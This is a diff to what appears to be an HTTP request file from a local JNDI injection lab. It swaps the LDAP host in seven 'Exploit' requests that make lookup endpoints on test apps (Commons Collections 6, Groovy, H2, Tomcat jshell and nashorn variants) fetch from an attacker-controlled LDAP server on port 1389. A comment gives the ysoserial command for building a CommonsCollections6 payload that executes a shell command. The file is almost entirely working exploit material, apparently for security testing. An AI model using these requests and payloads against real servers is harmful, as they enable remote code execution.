@@ -2,22 +2,22 @@
 ### For reference the command to generate the payload:
 ### java: 17.0.12-amzn
 ### $ java --add-opens java.base/java.util=ALL-UNNAMED -jar target/ysoserial-all.jar CommonsCollections6 "touch /usr/local/tomcat/temp/pwn.txt" > commonscollections6.bin
-GET http://localhost:8080/commons-collections-6-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=generic
+GET http://localhost:8080/commons-collections-6-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=generic
 
 ### Exploit Groovy
-GET http://localhost:8080/groovy-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=groovy
+GET http://localhost:8080/groovy-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=groovy
 
 ### Exploit H2
-GET http://localhost:8081/h2-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=h2
+GET http://localhost:8081/h2-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=h2
 
 ### Exploit Tomcat10-jshell
-GET http://localhost:8082/tomcat-10-jshell-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=tomcat10
+GET http://localhost:8082/tomcat-10-jshell-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=tomcat10
 
 ### Exploit Tomcat-jshell
-GET http://localhost:8083/tomcat-9-jshell-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=tomcat-jshell
+GET http://localhost:8083/tomcat-9-jshell-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=tomcat-jshell
 
 ### Exploit Tomcat10-nashorn
-GET http://localhost:8084/tomcat-10-nashorn-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=tomcat10
+GET http://localhost:8084/tomcat-10-nashorn-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=tomcat10
 
 ### Exploit Tomcat-nashorn
-GET http://localhost:8085/tomcat-9-nashorn-1.0-SNAPSHOT/lookup?resource=ldap://host.containers.internal:1389/o=tomcat
+GET http://localhost:8085/tomcat-9-nashorn-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=tomcat
